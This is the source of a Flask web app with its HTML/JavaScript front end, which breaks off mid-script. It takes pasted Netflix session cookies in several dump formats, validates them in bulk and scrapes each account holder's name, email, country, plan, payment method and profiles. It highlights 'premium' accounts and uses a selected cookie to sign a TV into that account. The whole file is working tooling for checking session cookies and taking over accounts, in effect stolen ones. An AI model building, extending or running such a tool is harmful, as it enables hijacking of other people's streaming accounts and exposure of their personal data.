# app.py - Netflix TV Login Web Application
# Run with: pip install flask flask-session requests beautifulsoup4 python-dotenv

import os
import re
import json
import urllib.parse
import requests
from flask import Flask, render_template, request, jsonify, session, redirect, url_for, flash
from flask_session import Session
from datetime import timedelta
import uuid
import logging
from bs4 import BeautifulSoup
import time
from dotenv import load_dotenv

# Load environment variables
load_dotenv()

# Configure logging
logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', 'your-secret-key-change-in-production')
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_FILE_DIR'] = './flask_session'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(hours=1)
Session(app)

# Ensure session directory exists
os.makedirs('./flask_session', exist_ok=True)

# Netflix API endpoints
NETFLIX_URLS = {
    'account': 'https://www.netflix.com/YourAccount',
    'manage_profiles': 'https://www.netflix.com/ManageProfiles',
    'tv_login': 'https://www.netflix.com/tv2',
    'tv_success': 'https://www.netflix.com/tv/out/success'
}

# User-Agent for requests
USER_AGENT = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'

# Helper Functions
def extract_netflix_ids(content):
    """Extract NetflixId from various formats"""
    netflix_ids = []
    
    if not content or not isinstance(content, str):
        return netflix_ids
    
    # JSON format
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get('name') == 'NetflixId':
                    netflix_ids.append(cookie.get('value'))
        elif isinstance(data, dict):
            if 'NetflixId' in data:
                netflix_ids.append(data['NetflixId'])
            elif 'cookies' in data and isinstance(data['cookies'], list):
                for cookie in data['cookies']:
                    if cookie.get('name') == 'NetflixId':
                        netflix_ids.append(cookie.get('value'))
    except:
        pass
    
    # Netscape format
    netscape_matches = re.findall(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    for match in netscape_matches:
        try:
            netflix_id = urllib.parse.unquote(match) if '%' in match else match
            if netflix_id and netflix_id not in netflix_ids:
                netflix_ids.append(netflix_id)
        except:
            if match not in netflix_ids:
                netflix_ids.append(match)
    
    # Text format (NetflixId=value)
    txt_matches = re.findall(r'NetflixId=([^\s\n;,\'"]+)', content)
    for match in txt_matches:
        try:
            netflix_id = urllib.parse.unquote(match) if '%' in match else match
            if netflix_id and netflix_id not in netflix_ids:
                netflix_ids.append(netflix_id)
        except:
            if match not in netflix_ids:
                netflix_ids.append(match)
    
    # Plain text format
    plain_matches = re.findall(r'(?<!\wSecure)NetflixId[=:\s]+([^\s;,\n\'"]+)', content, re.IGNORECASE)
    for match in plain_matches:
        try:
            netflix_id = urllib.parse.unquote(match) if '%' in match else match
            if netflix_id and netflix_id not in netflix_ids and not re.search(r'Secure', netflix_id, re.I):
                netflix_ids.append(netflix_id)
        except:
            if match not in netflix_ids and not re.search(r'Secure', match, re.I):
                netflix_ids.append(match)
    
    return list(dict.fromkeys(netflix_ids))  # Remove duplicates

def create_cookie_dict(netflix_id):
    """Create cookie dictionary from NetflixId"""
    return {
        'NetflixId': netflix_id,
        'SecureNetflixId': None  # Will be set if available
    }

def check_cookie(session, cookie_dict):
    """Check if cookie is valid and get account info"""
    try:
        session.cookies.update(cookie_dict)
        response = session.get(NETFLIX_URLS['account'], timeout=15)
        text = response.text
        
        # Check if logged in
        if '"mode":"login"' in text:
            return {'valid': False, 'error': 'Invalid or expired cookie'}
        
        if '"mode":"yourAccount"' not in text and 'membershipStatus' not in text:
            return {'valid': False, 'error': 'Not logged in'}
        
        # Extract account info
        account_info = {}
        
        # Name
        name_match = re.search(r'"userInfo":\{"data":\{"name":"([^"]+)"', text)
        if name_match:
            account_info['name'] = name_match.group(1).replace('\\x20', ' ')
        else:
            account_info['name'] = 'Unknown'
        
        # Email
        email_match = re.search(r'"growthEmail":\{.*?"email":\{.*?"value":"([^"]+)"', text, re.DOTALL)
        if not email_match:
            email_match = re.search(r'"emailAddress"\s*:\s*"([^"]+)"', text)
        if email_match:
            email = email_match.group(1).replace('\\x40', '@')
            try:
                email = urllib.parse.unquote(email)
            except:
                pass
            account_info['email'] = email
        else:
            account_info['email'] = 'Unknown'
        
        # Country
        country_match = re.search(r'"currentCountry":"([^"]+)"', text)
        if not country_match:
            country_match = re.search(r'"countryCode":"([^"]+)"', text)
        account_info['country'] = country_match.group(1) if country_match else 'Unknown'
        
        # Plan
        plan_match = re.search(r'localizedPlanName.{1,50}?value":"([^"]+)"', text)
        if not plan_match:
            plan_match = re.search(r'"planName"\s*:\s*"([^"]+)"', text)
        if plan_match:
            plan = plan_match.group(1).replace('\\x20', ' ').replace('\\x28', '(').replace('\\x29', ')')
            account_info['plan'] = plan
        else:
            account_info['plan'] = 'Unknown'
        
        # Video Quality
        quality_match = re.search(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"', text)
        account_info['video_quality'] = quality_match.group(1) if quality_match else 'Unknown'
        
        # Max Streams
        streams_match = re.search(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)', text)
        account_info['max_streams'] = streams_match.group(1) if streams_match else 'Unknown'
        
        # Member Since
        member_match = re.search(r'"memberSince":"([^"]+)"', text)
        account_info['member_since'] = member_match.group(1) if member_match else 'Unknown'
        
        # Payment Method
        payment_match = re.search(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"', text)
        account_info['payment_method'] = payment_match.group(1) if payment_match else 'Unknown'
        
        # Get profiles
        try:
            profiles_resp = session.get(NETFLIX_URLS['manage_profiles'], timeout=10)
            profiles = extract_profiles(profiles_resp.text)
            account_info['profiles'] = profiles
            account_info['profile_count'] = len(profiles)
        except:
            account_info['profiles'] = []
            account_info['profile_count'] = 0
        
        account_info['valid'] = True
        account_info['premium'] = 'premium' in account_info.get('plan', '').lower() or '4K' in account_info.get('video_quality', '')
        
        return account_info
        
    except requests.exceptions.Timeout:
        return {'valid': False, 'error': 'Request timeout'}
    except requests.exceptions.ConnectionError:
        return {'valid': False, 'error': 'Connection error'}
    except Exception as e:
        logger.error(f"Error checking cookie: {e}")
        return {'valid': False, 'error': str(e)}

def extract_profiles(html_content):
    """Extract profile names from ManageProfiles page"""
    profiles = []
    try:
        # Try JSON method
        profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', html_content)
        for profile in profile_matches:
            profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
            if profile not in profiles:
                profiles.append(profile)
        
        if not profiles:
            # Try BeautifulSoup
            soup = BeautifulSoup(html_content, 'html.parser')
            profile_elements = soup.find_all('span', class_='profile-name')
            for elem in profile_elements:
                profile = elem.get_text().strip()
                if profile and profile not in profiles:
                    profiles.append(profile)
    except Exception as e:
        logger.error(f"Error extracting profiles: {e}")
    
    return profiles

def extract_auth_url(session):
    """Extract authURL for TV login"""
    try:
        response = session.get('https://www.netflix.com/account', timeout=10)
        text = response.text
        auth_match = re.search(r'"authURL":"([^"]+)"', text)
        if auth_match:
            auth_url = auth_match.group(1)
            return auth_url.replace('\\x2F', '/').replace('\\x3D', '=')
    except Exception as e:
        logger.error(f"Error extracting authURL: {e}")
    return None

def perform_tv_login(session, auth_url, tv_code):
    """Perform TV login with code"""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': USER_AGENT,
            'origin': 'https://www.netflix.com',
            'referer': 'https://www.netflix.com/account'
        }
        
        data = {
            'flow': 'websiteSignUp',
            'authURL': auth_url,
            'flowMode': 'enterTvLoginRendezvousCode',
            'withFields': 'tvLoginRendezvousCode,isTvUrl2',
            'code': tv_code,
            'tvLoginRendezvousCode': tv_code,
            'isTvUrl2': 'true',
            'action': 'nextAction'
        }
        
        response = session.post(NETFLIX_URLS['tv_login'], headers=headers, data=data, allow_redirects=False, timeout=15)
        
        if response.status_code == 302 and response.headers.get('location') == NETFLIX_URLS['tv_success']:
            return {'success': True, 'message': 'TV login successful!'}
        elif "That code wasn't right" in response.text:
            return {'success': False, 'message': 'Invalid TV code. Please check and try again.'}
        else:
            return {'success': False, 'message': 'TV login failed. Please try again.'}
            
    except requests.exceptions.Timeout:
        return {'success': False, 'message': 'Request timeout. Please try again.'}
    except Exception as e:
        logger.error(f"TV login error: {e}")
        return {'success': False, 'message': f'Error: {str(e)}'}

# Routes
@app.route('/')
def index():
    """Home page"""
    return render_template('index.html')

@app.route('/extract', methods=['POST'])
def extract_cookies():
    """Extract NetflixId from provided content"""
    try:
        data = request.get_json()
        content = data.get('content', '')
        
        if not content:
            return jsonify({'success': False, 'error': 'No content provided'})
        
        netflix_ids = extract_netflix_ids(content)
        
        if not netflix_ids:
            return jsonify({'success': False, 'error': 'No Netflix cookies found in the provided content'})
        
        return jsonify({
            'success': True,
            'netflix_ids': netflix_ids[:10],  # Limit to 10
            'count': len(netflix_ids)
        })
        
    except Exception as e:
        logger.error(f"Extract error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/check', methods=['POST'])
def check_cookies():
    """Check multiple cookies and get account info"""
    try:
        data = request.get_json()
        netflix_ids = data.get('netflix_ids', [])
        
        if not netflix_ids:
            return jsonify({'success': False, 'error': 'No Netflix IDs provided'})
        
        # Limit to 5 for performance
        netflix_ids = netflix_ids[:5]
        
        results = []
        session_id = str(uuid.uuid4())
        
        # Store in session for later use
        if 'checked_cookies' not in session:
            session['checked_cookies'] = {}
        
        for i, netflix_id in enumerate(netflix_ids):
            try:
                netflix_session = requests.Session()
                netflix_session.headers.update({'User-Agent': USER_AGENT})
                
                cookie_dict = create_cookie_dict(netflix_id)
                account_info = check_cookie(netflix_session, cookie_dict)
                
                if account_info.get('valid'):
                    result = {
                        'id': i,
                        'netflix_id': netflix_id[:20] + '...' if len(netflix_id) > 20 else netflix_id,
                        'full_id': netflix_id,
                        'name': account_info.get('name', 'Unknown'),
                        'email': account_info.get('email', 'Unknown'),
                        'country': account_info.get('country', 'Unknown'),
                        'plan': account_info.get('plan', 'Unknown'),
                        'video_quality': account_info.get('video_quality', 'Unknown'),
                        'max_streams': account_info.get('max_streams', 'Unknown'),
                        'member_since': account_info.get('member_since', 'Unknown'),
                        'payment_method': account_info.get('payment_method', 'Unknown'),
                        'profiles': account_info.get('profiles', []),
                        'profile_count': account_info.get('profile_count', 0),
                        'premium': account_info.get('premium', False),
                        'valid': True,
                        'session_id': session_id
                    }
                    
                    # Store in session
                    session['checked_cookies'][session_id] = {
                        'netflix_id': netflix_id,
                        'account_info': result
                    }
                    
                    results.append(result)
                else:
                    results.append({
                        'id': i,
                        'netflix_id': netflix_id[:20] + '...' if len(netflix_id) > 20 else netflix_id,
                        'valid': False,
                        'error': account_info.get('error', 'Invalid cookie')
                    })
                    
            except Exception as e:
                logger.error(f"Error checking cookie {i}: {e}")
                results.append({
                    'id': i,
                    'netflix_id': netflix_id[:20] + '...' if len(netflix_id) > 20 else netflix_id,
                    'valid': False,
                    'error': str(e)
                })
        
        # Commit session
        session.modified = True
        
        valid_count = sum(1 for r in results if r.get('valid'))
        
        return jsonify({
            'success': True,
            'results': results,
            'valid_count': valid_count,
            'total_count': len(results)
        })
        
    except Exception as e:
        logger.error(f"Check error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/login', methods=['POST'])
def login_tv():
    """Login to TV with selected cookie and code"""
    try:
        data = request.get_json()
        session_id = data.get('session_id')
        netflix_id = data.get('netflix_id')
        tv_code = data.get('tv_code', '').strip()
        
        if not session_id or not netflix_id or not tv_code:
            return jsonify({'success': False, 'error': 'Missing required parameters'})
        
        # Validate TV code
        if not re.match(r'^\d{8}$', tv_code):
            return jsonify({'success': False, 'error': 'TV code must be 8 digits'})
        
        # Get from session
        if 'checked_cookies' not in session or session_id not in session['checked_cookies']:
            return jsonify({'success': False, 'error': 'Session expired. Please check cookies again.'})
        
        cookie_data = session['checked_cookies'][session_id]
        
        # Create session for TV login
        netflix_session = requests.Session()
        netflix_session.headers.update({'User-Agent': USER_AGENT})
        netflix_session.cookies.update({'NetflixId': netflix_id})
        
        # Get authURL
        auth_url = extract_auth_url(netflix_session)
        if not auth_url:
            return jsonify({'success': False, 'error': 'Failed to get authURL. Cookie may be invalid.'})
        
        # Perform TV login
        result = perform_tv_login(netflix_session, auth_url, tv_code)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/clear-session', methods=['POST'])
def clear_session():
    """Clear session data"""
    try:
        session.clear()
        return jsonify({'success': True})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

# HTML Templates
@app.route('/templates/index.html')
def serve_template():
    """Serve the main template (for development)"""
    return render_template('index.html')

# Create templates directory and index.html
os.makedirs('templates', exist_ok=True)

with open('templates/index.html', 'w', encoding='utf-8') as f:
    f.write('''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix TV Login · Cookie Manager</title>
    <!-- Fonts & Icons -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:ital,opsz,wght@0,14..32,400..700;1,14..32,400..700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, #000000 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            line-height: 1.5;
            padding: 2rem 1rem;
        }

        .container {
            max-width: 1200px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 3rem;
        }

        .logo {
            font-size: 3rem;
            font-weight: 700;
            background: linear-gradient(135deg, #E50914, #b20710);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
        }

        .logo i {
            background: linear-gradient(135deg, #E50914, #b20710);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .subtitle {
            color: #9ca3af;
            font-size: 1.1rem;
        }

        /* Cards */
        .card {
            background: rgba(255, 255, 255, 0.05);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 24px;
            padding: 2rem;
            margin-bottom: 2rem;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        .card:hover {
            transform: translateY(-2px);
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.4);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 1.5rem;
        }

        .card-header i {
            font-size: 2rem;
            color: #E50914;
        }

        .card-header h2 {
            font-size: 1.5rem;
            font-weight: 600;
        }

        .card-header p {
            color: #9ca3af;
            font-size: 0.9rem;
        }

        /* Forms */
        .form-group {
            margin-bottom: 1.5rem;
        }

        label {
            display: block;
            margin-bottom: 0.5rem;
            color: #d1d5db;
            font-weight: 500;
        }

        textarea, input {
            width: 100%;
            padding: 1rem;
            background: rgba(0, 0, 0, 0.3);
            border: 2px solid rgba(255, 255, 255, 0.1);
            border-radius: 16px;
            color: #ffffff;
            font-family: 'Inter', monospace;
            font-size: 0.95rem;
            transition: all 0.2s;
        }

        textarea {
            min-height: 200px;
            resize: vertical;
        }

        textarea:focus, input:focus {
            outline: none;
            border-color: #E50914;
            background: rgba(0, 0, 0, 0.5);
        }

        /* Buttons */
        .btn {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            gap: 0.75rem;
            padding: 1rem 2rem;
            border-radius: 40px;
            font-weight: 600;
            font-size: 1rem;
            border: none;
            cursor: pointer;
            transition: all 0.2s;
            width: 100%;
        }

        .btn-primary {
            background: #E50914;
            color: #ffffff;
        }

        .btn-primary:hover:not(:disabled) {
            background: #b20710;
            transform: scale(1.02);
        }

        .btn-primary:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }

        .btn-secondary {
            background: rgba(255, 255, 255, 0.1);
            color: #ffffff;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .btn-secondary:hover:not(:disabled) {
            background: rgba(255, 255, 255, 0.15);
        }

        .btn-outline {
            background: transparent;
            border: 2px solid #E50914;
            color: #E50914;
        }

        .btn-outline:hover {
            background: #E50914;
            color: #ffffff;
        }

        /* Account Cards */
        .account-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
            gap: 1.5rem;
            margin: 1.5rem 0;
        }

        .account-card {
            background: rgba(255, 255, 255, 0.03);
            border: 2px solid rgba(255, 255, 255, 0.05);
            border-radius: 20px;
            padding: 1.5rem;
            transition: all 0.2s;
            cursor: pointer;
            position: relative;
        }

        .account-card:hover {
            border-color: #E50914;
            transform: translateY(-2px);
        }

        .account-card.selected {
            border-color: #E50914;
            background: rgba(229, 9, 20, 0.1);
            box-shadow: 0 0 30px rgba(229, 9, 20, 0.2);
        }

        .account-badge {
            position: absolute;
            top: 1rem;
            right: 1rem;
            background: #E50914;
            color: white;
            padding: 0.25rem 0.75rem;
            border-radius: 40px;
            font-size: 0.75rem;
            font-weight: 600;
        }

        .account-name {
            font-size: 1.25rem;
            font-weight: 600;
            margin-bottom: 1rem;
            padding-right: 4rem;
        }

        .account-detail {
            display: flex;
            align-items: center;
            gap: 0.75rem;
            margin-bottom: 0.75rem;
            color: #d1d5db;
        }

        .account-detail i {
            width: 20px;
            color: #E50914;
        }

        /* Steps */
        .steps {
            display: flex;
            justify-content: space-between;
            margin-bottom: 3rem;
            position: relative;
        }

        .step {
            flex: 1;
            text-align: center;
            position: relative;
            z-index: 1;
        }

        .step-number {
            width: 40px;
            height: 40px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 1rem;
            font-weight: 600;
            transition: all 0.2s;
        }

        .step.active .step-number {
            background: #E50914;
            border-color: #E50914;
            color: white;
        }

        .step.completed .step-number {
            background: #10b981;
            border-color: #10b981;
            color: white;
        }

        .step-title {
            font-size: 0.9rem;
            color: #9ca3af;
        }

        .step.active .step-title {
            color: #ffffff;
            font-weight: 600;
        }

        /* Progress bar */
        .progress-bar {
            position: relative;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            margin: 0 0 2rem;
        }

        .progress-fill {
            position: absolute;
            height: 100%;
            background: #E50914;
            border-radius: 2px;
            transition: width 0.3s;
        }

        /* TV Code Input */
        .tv-code-container {
            display: flex;
            gap: 1rem;
            align-items: center;
        }

        .tv-code-input {
            flex: 1;
            text-align: center;
            font-size: 1.5rem;
            letter-spacing: 8px;
            font-weight: 600;
        }

        /* Alerts */
        .alert {
            padding: 1rem;
            border-radius: 16px;
            margin-bottom: 1rem;
            display: flex;
            align-items: center;
            gap: 0.75rem;
        }

        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid #10b981;
            color: #10b981;
        }

        .alert-error {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid #ef4444;
            color: #ef4444;
        }

        .alert-info {
            background: rgba(59, 130, 246, 0.1);
            border: 1px solid #3b82f6;
            color: #3b82f6;
        }

        /* Loading spinner */
        .spinner {
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            from { transform: rotate(0deg); }
            to { transform: rotate(360deg); }
        }

        /* Responsive */
        @media (max-width: 768px) {
            .card {
                padding: 1.5rem;
            }
            
            .account-grid {
                grid-template-columns: 1fr;
            }
            
            .tv-code-container {
                flex-direction: column;
            }
            
            .steps {
                flex-direction: column;
                gap: 1rem;
            }
            
            .step {
                display: flex;
                align-items: center;
                gap: 1rem;
                text-align: left;
            }
            
            .step-number {
                margin: 0;
            }
        }

        /* Utilities */
        .hidden {
            display: none !important;
        }

        .mt-2 { margin-top: 0.5rem; }
        .mt-4 { margin-top: 1rem; }
        .mt-6 { margin-top: 1.5rem; }
        .mb-2 { margin-bottom: 0.5rem; }
        .mb-4 { margin-bottom: 1rem; }
        .text-center { text-align: center; }
        .text-red { color: #E50914; }
        .text-green { color: #10b981; }
        .flex { display: flex; }
        .gap-2 { gap: 0.5rem; }
        .gap-4 { gap: 1rem; }
        .items-center { align-items: center; }
        .justify-between { justify-content: space-between; }
    </style>
</head>
<body>
    <div class="container">
        <!-- Header -->
        <div class="header">
            <div class="logo">
                <i class="fab fa-netflix"></i>
                <span>TV Login</span>
            </div>
            <p class="subtitle">Login to Netflix TV using cookies · Multiple formats supported</p>
        </div>

        <!-- Progress Bar -->
        <div class="progress-bar">
            <div class="progress-fill" id="progressFill" style="width: 0%"></div>
        </div>

        <!-- Steps -->
        <div class="steps" id="steps">
            <div class="step active" id="step1">
                <div class="step-number">1</div>
                <div class="step-title">Paste Cookies</div>
            </div>
            <div class="step" id="step2">
                <div class="step-number">2</div>
                <div class="step-title">Select Account</div>
            </div>
            <div class="step" id="step3">
                <div class="step-number">3</div>
                <div class="step-title">Enter TV Code</div>
            </div>
            <div class="step" id="step4">
                <div class="step-number">4</div>
                <div class="step-title">Success!</div>
            </div>
        </div>

        <!-- Main Card -->
        <div class="card" id="mainCard">
            <!-- Step 1: Cookie Input -->
            <div id="step1Content">
                <div class="card-header">
                    <i class="fas fa-cookie"></i>
                    <div>
                        <h2>Enter Netflix Cookies</h2>
                        <p>Paste cookies in any format (Netscape, JSON, text, etc.)</p>
                    </div>
                </div>

                <div class="form-group">
                    <textarea id="cookieInput" placeholder='Example:
NetflixId=abcdef123456...
or
{"name": "NetflixId", "value": "abcdef123456..."}
or
.netflix.com TRUE / TRUE 1735689600 NetflixId abcdef123456...'></textarea>
                </div>

                <div class="flex gap-4">
                    <button class="btn btn-primary" id="extractBtn" onclick="extractCookies()">
                        <i class="fas fa-search"></i>
                        Extract Cookies
                    </button>
                    <button class="btn btn-secondary" id="clearBtn" onclick="clearAll()">
                        <i class="fas fa-trash"></i>
                        Clear
                    </button>
                </div>
            </div>

            <!-- Step 2: Account Selection -->
            <div id="step2Content" class="hidden">
                <div class="card-header">
                    <i class="fas fa-users"></i>
                    <div>
                        <h2>Select Account</h2>
                        <p>Choose which account to use for TV login</p>
                    </div>
                </div>

                <div id="accountList" class="account-grid">
                    <!-- Accounts will be populated here -->
                </div>

                <div class="flex gap-4 mt-4">
                    <button class="btn btn-secondary" onclick="goToStep1()">
                        <i class="fas fa-arrow-left"></i>
                        Back
                    </button>
                    <button class="btn btn-primary" id="proceedToCodeBtn" onclick="proceedToCode()" disabled>
                        <i class="fas fa-arrow-right"></i>
                        Proceed to Code
                    </button>
                </div>
            </div>

            <!-- Step 3: TV Code Input -->
            <div id="step3Content" class="hidden">
                <div class="card-header">
                    <i class="fas fa-tv"></i>
                    <div>
                        <h2>Enter TV Code</h2>
                        <p>Enter the 8-digit code shown on your TV</p>
                    </div>
                </div>

                <div class="form-group">
                    <div class="tv-code-container">
                        <input type="text" class="tv-code-input" id="tvCode" maxlength="8" placeholder="••••••••" inputmode="numeric" pattern="[0-9]*">
                    </div>
                </div>

                <div class="flex gap-4">
                    <button class="btn btn-secondary" onclick="goToStep2()">
                        <i class="fas fa-arrow-left"></i>
                        Back
                    </button>
                    <button class="btn btn-primary" id="loginBtn" onclick="performLogin()">
                        <i class="fas fa-sign-in-alt"></i>
                        Login to TV
                    </button>
                </div>
            </div>

            <!-- Step 4: Success -->
            <div id="step4Content" class="hidden">
                <div class="text-center">
                    <i class="fas fa-check-circle" style="font-size: 4rem; color: #10b981; margin-bottom: 1rem;"></i>
                    <h2 style="margin-bottom: 1rem;">Login Successful!</h2>
                    <p style="color: #9ca3af; margin-bottom: 2rem;">Your TV should now be logged into Netflix.</p>
                    
                    <div class="flex gap-4">
                        <button class="btn btn-secondary" onclick="startNew()">
                            <i class="fas fa-redo"></i>
                            New Login
                        </button>
                    </div>
                </div>
            </div>

            <!-- Alerts container -->
            <div id="alertContainer" class="mt-4"></div>
        </div>
    </div>

    <script>
        // State management
        let currentStep = 1;
        let selectedAccount = null;
        let sessionId = null;
        let allAccounts = [];

        // Progress bar update
        function updateProgress() {
            const progress = (currentStep / 4) * 100;
            document.getElementById('progressFill').style.width = progress + '%';
            
            // Update steps
            for (let i = 1; i <= 4; i++) {
                const step = document.getElementById(`step${i}`);
                if (i < currentStep) {
                    step.classList.add('completed');
                    step.classList.remove('active');
                } else if (i === currentStep) {
                    step.classList.add('active');
                    step.classList.remove('completed');
                } else {
                    step.classList.remove('active', 'completed');
                }
            }
            
            // Show/hide step content
            for (let i = 1; i <= 4; i++) {
                const content = document.getElementById(`step${i}Content`);
                if (i === currentStep) {
                    content.classList.remove('hidden');
                } else {
                    content.classList.add('hidden');
                }
            }
        }

        // Show alert
        function showAlert(type, message, timeout = 5000) {
            const container = document.getElementById('alertContainer');
            const alert = document.createElement('div');
            alert.className = `alert alert-${type}`;
            alert.innerHTML = `
                <i class="fas ${type === 'success' ? 'fa-check-circle' : type === 'error' ? 'fa-exclamation-circle' : 'fa-info-circle'}"></i>
                <span>${message}</span>
            `;
            
            container.innerHTML = '';
            container.appendChild(alert);
            
            if (timeout > 0) {
                setTimeout(() => {
                    if (alert.parentNode) {
                        alert.remove();
                    }
                }, timeout);
            }
        }

        // Loading state
        function setLoading(buttonId, isLoading, text = null) {
            const btn = document.getElementById(buttonId);
            if (!btn) return;
            
            if (isLoading) {
                btn.disabled = true;
                btn.innerHTML = '<i class="fas fa-spinner spinner"></i> Loading...';
            } else {
                btn.disabled = false;
                btn.innerHTML = text || btn.getAttribute('data-original-text') || btn.innerHTML;
            }
        }

        // Extract cookies
        async function extractCookies() {
            const input = document.getElementById('cookieInput').value.trim();
            if (!input) {
                showAlert('error', 'Please paste your cookies first');
                return;
            }

            setLoading('extractBtn', true);
            showAlert('info', 'Extracting cookies...', 0);

            try {
                const response = await fetch('/extract', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: input })
                });

                const data = await response.json();

                if (data.success) {
                    if (data.count > 0) {
                        showAlert('success', `Found ${data.count} cookie(s). Checking validity...`);
                        await checkCookies(data.netflix_ids);
                    } else {
                        showAlert('error', 'No Netflix cookies found in the provided content');
                    }
                } else {
                    showAlert('error', data.error || 'Failed to extract cookies');
                }
            } catch (error) {
                showAlert('error', 'Network error. Please try again.');
            } finally {
                setLoading('extractBtn', false);
            }
        }

        // Check cookies
        async function checkCookies(netflixIds) {
            setLoading('extractBtn', true);
            
            try {
                const response = await fetch('/check', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ netflix_ids: netflixIds })
                });

                const data = await response.json();

                if (data.success) {
                    const validAccounts = data.results.filter(r => r.valid);
                    
                    if (validAccounts.length > 0) {
                        allAccounts = validAccounts;
                        sessionId = validAccounts[0]?.session_id;
                        displayAccounts(validAccounts);
                        currentStep = 2;
                        updateProgress();
                        showAlert('success', `Found ${validAccounts.length} valid premium account(s)`);
                    } else {
                        showAlert('error', 'No valid premium accounts found');
                    }
                } else {
                    showAlert('error', data.error || 'Failed to check cookies');
                }
            } catch (error) {
                showAlert('error', 'Network error. Please try again.');
            } finally {
                setLoading('extractBtn', false);
            }
        }

        // Display accounts
        function displayAccounts(accounts) {
            const container = document.getElementById('accountList');
            container.innerHTML = '';
            
            accounts.forEach((account, index) => {
                const card = document.createElement('div');
                card.className = `account-card ${index === 0 ? 'selected' : ''}`;
                card.setAttribute('onclick', `selectAccount(${index})`);
                card.setAttribute('data-index', index);
                
                if (account.premium) {
                    card.innerHTML += '<span class="account-badge">PREMIUM</span>';
                }
                
                card.innerHTML += `
                    <div class="account-name">${account.name || 'Unknown'}</div>
                    <div class="account-detail">
                        <i class="fas fa-envelope"></i>
                        <span>${account.email || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-globe"></i>
                        <span>${account.country || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-tag"></i>
                        <span>${account.plan || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-video"></i>
                        <span>${account.video_quality || 'Unknown'}</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-users"></i>
                        <span>${account.max_streams || '?'} streams · ${account.profile_count || 0} profiles</span>
                    </div>
                    <div class="account-detail">
                        <i class="fas fa-calendar"></i>
                        <span>Member since: ${account.member_since || 'Unknown'}</span>
                    </div>
                `;
                
                container.appendChild(card);
            });
            
            // Select first account by default
            selectedAccount = accounts[0];
            document.getElementById('proceedToCodeBtn').disabled = false;
        }

        // Select account
        function selectAccount(index) {
            // Remove selected class from all cards
            document.querySelectorAll('.account-card').forEach(card => {
                card.classList.remove('selected');
            });
            
            // Add selected class to clicked card
            document.querySelector(`.account-card[data-index="${index}"]`).classList.add('selected');
            
            selectedAccount = allAccounts[index];
            document.getElementById('proceedToCodeBtn').disabled = false;
        }

        // Navigation
        function goToStep1() {
            currentStep = 1;
            updateProgress();
        }

        function goToStep2() {
            if (allAccounts.length > 0) {
                currentStep = 2;
                updateProgress();
            } else {
                goToStep1();
            }
        }

        function proceedToCode() {
            if (!selectedAccount) {
                showAlert('error', 'Please select an account first');
                return;
            }
            currentStep = 3;
            updateProgress();
            document.getElementById('tvCode').focus();
        }

        // Perform login
        async function performLogin() {
